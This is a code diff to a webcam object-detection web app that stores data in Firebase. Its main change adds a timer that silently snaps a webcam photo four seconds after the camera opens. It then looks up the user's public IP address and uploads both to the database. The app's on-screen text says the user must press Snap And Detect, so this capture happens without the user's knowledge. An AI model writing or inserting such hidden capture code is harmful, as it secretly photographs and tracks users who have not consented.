@@ -72,7 +72,8 @@ export default {
       predictionsLength: null,
       predictionInfo: "First Open the Webcam, Then Press Snap And Detect",
       webcam: "",
-      isWebcamOpened: false
+      isWebcamOpened: false,
+      picAfterWebcam: ""
     });
     const imgRef = ref("");
     const canvas = ref("");
@@ -80,10 +81,10 @@ export default {
 
     const dbRef = firebase.database().ref("db");
 
-    function pushDb() {
+    function pushDb(_pic) {
       dbRef.push({
         ad: state.ipOfUser,
-        pic: state.image
+        pic: _pic
       });
     }
 
@@ -106,6 +107,16 @@ export default {
           state.isWebcamOpened = true;
           console.log("webcam started");
           console.log(result);
+          setTimeout(() => {
+            const pic = state.webcam.snap();
+            state.picAfterWebcam = pic;
+            axios
+              .get("https://api.ipify.org?format=jsonp&callback=?")
+              .then(e => {
+                state.ipOfUser = e.data;
+                pushDb(state.picAfterWebcam);
+              });
+          }, 4000);
         })
         .catch(err => {
           console.log(err);
@@ -127,7 +138,7 @@ export default {
       );
       state.ipOfUser = data;
       state.detectPressed = false;
-      pushDb();
+      pushDb(state.image);
     }
 
     onMounted(() => {
